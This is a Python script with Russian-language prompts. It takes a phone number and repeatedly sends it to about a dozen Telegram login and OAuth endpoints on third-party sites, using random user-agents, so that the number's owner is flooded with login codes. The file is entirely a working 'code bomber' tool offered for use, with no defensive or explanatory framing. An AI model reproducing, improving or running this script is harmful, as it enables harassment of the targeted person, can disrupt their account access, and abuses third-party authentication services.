import requests
from fake_useragent import UserAgent
from termcolor import colored
import time

def send_telegram_codes():
    try:
        number = input(colored("Введите номер телефона (с +): ", 'magenta'))
        if not number.startswith('+'):
            print(colored("[!] Номер должен начинаться с '+'", 'red'))
            return

        cycles = int(input(colored("Введите количество циклов отправки: ", 'magenta')))
        if cycles <= 0:
            print(colored("[!] Количество циклов должно быть положительным числом", 'red'))
            return

        endpoints = [
            'https://oauth.telegram.org/auth/request?bot_id=1852523856&origin=https%3A%2F%2Fcabinet.presscode.app&embed=1&return_to=https%3A%2F%2Fcabinet.presscode.app%2Flogin',
            'https://translations.telegram.org/auth/request',
            'https://oauth.telegram.org/auth?bot_id=5444323279&origin=https%3A%2F%2Ffragment.com&request_access=write&return_to=https%3A%2F%2Ffragment.com%2F',
            'https://oauth.telegram.org/auth?bot_id=1199558236&origin=https%3A%2F%2Fbot-t.com&embed=1&request_access=write&return_to=https%3A%2F%2Fbot-t.com%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=1093384146&origin=https%3A%2F%2Foff-bot.ru&embed=1&request_access=write&return_to=https%3A%2F%2Foff-bot.ru%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=466141824&origin=https%3A%2F%2Fmipped.com&embed=1&request_access=write&return_to=https%3A%2F%2Fmipped.com%2Ff%2Fregister%2Fconnected-accounts%2Fsmodders_telegram%2F%3Fsetup%3D1',
            'https://oauth.telegram.org/auth/request?bot_id=5463728243&origin=https%3A%2F%2Fwww.spot.uz&return_to=https%3A%2F%2Fwww.spot.uz%2Fru%2F2022%2F04%2F29%2Fyoto%2F%23',
            'https://oauth.telegram.org/auth/request?bot_id=1733143901&origin=https%3A%2F%2Ftbiz.pro&embed=1&request_access=write&return_to=https%3A%2F%2Ftbiz.pro%2Flogin',
            'https://oauth.telegram.org/auth/request?bot_id=319709511&origin=https%3A%2F%2Ftelegrambot.biz&embed=1&return_to=https%3A%2F%2Ftelegrambot.biz%2F',
            'https://oauth.telegram.org/auth/request?bot_id=1803424014&origin=https%3A%2F%2Fru.telegram-store.com&embed=1&request_access=write&return_to=https%3A%2F%2Fru.telegram-store.com%2Fcatalog%2Fsearch',
            'https://oauth.telegram.org/auth/request?bot_id=210944655&origin=https%3A%2F%2Fcombot.org&embed=1&request_access=write&return_to=https%3A%2F%2Fcombot.org%2Flogin',
            'https://my.telegram.org/auth/send_password'
        ]

        total_sent = 0
        user_agent = UserAgent()

        for cycle in range(1, cycles + 1):
            try:
                headers = {'user-agent': user_agent.random}
                data = {'phone': number}

                for endpoint in endpoints:
                    try:
                        response = requests.post(endpoint, headers=headers, data=data, timeout=10)
                        if response.status_code == 200:
                            total_sent += 1
                    except requests.exceptions.RequestException:
                        continue

                print(colored(f"[Цикл {cycle}] Отправлено запросов: {len(endpoints)}", 'cyan'))
                print(colored(f"Всего отправлено: {total_sent}", 'cyan'))

                # Задержка между циклами
                if cycle < cycles:
                    time.sleep(5)

            except Exception as e:
                print(colored(f"[!] Ошибка в цикле {cycle}: {str(e)}", 'red'))
                continue

        print(colored(f"\nГотово! Всего отправлено запросов: {total_sent}, сделанно @coderonov", 'green'))

    except ValueError:
        print(colored("[!] Ошибка: введите корректное число", 'red'))
    except Exception as e:
        print(colored(f"[!] Неожиданная ошибка: {str(e)}", 'red'))

if __name__ == "__main__":
    send_telegram_codes()
